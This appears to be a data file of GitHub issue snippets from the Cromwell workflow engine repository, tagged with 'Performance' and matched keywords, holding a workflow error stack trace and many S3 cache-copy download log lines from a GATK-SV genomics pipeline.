Performance,"-dd0b1399-ebb6-4d9b-89ea-7da193994220; 2018-06-07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWork",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99083,concurren,concurrent,99083,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi; 1608597371711,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz; 1608597374474,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz; 1608597376806,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:117879,cache,cacheCopy,117879,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz.tbi; 1608596983896,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz; 1608596985970,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi; 1608596987867,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:13163,cache,cacheCopy,13163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz.tbi; 1608596958265,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz; 1608596960348,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi; 1608596962113,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:5669,cache,cacheCopy,5669,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz.tbi; 1608596968605,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz; 1608596971072,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi; 1608596972311,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:8796,cache,cacheCopy,8796,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz.tbi; 1608597093130,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz; 1608597095782,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-91/cacheCopy/SR00c.HG03727.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-91/cacheCopy/SR00c.HG03727.txt.gz; 1608597098791,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:43099,cache,cacheCopy,43099,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz.tbi; 1608597129434,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz; 1608597132184,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz; 1608597133659,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-109/cacheCopy/SR00c.NA18499.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:53071,cache,cacheCopy,53071,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz.tbi; 1608597236161,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz; 1608597239225,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz; 1608597241175,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:81722,cache,cacheCopy,81722,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz.tbi; 1608597263910,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz; 1608597266985,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz; 1608597268460,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:89209,cache,cacheCopy,89209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi; 1608597557397,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz; 1608597560491,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz; 1608597562850,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-38/cacheCopy/SR00c.HG01799.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:173030,cache,cacheCopy,173030,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz.tbi; 1608597451192,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz; 1608597453442,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz.tbi; 1608597455771,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz to 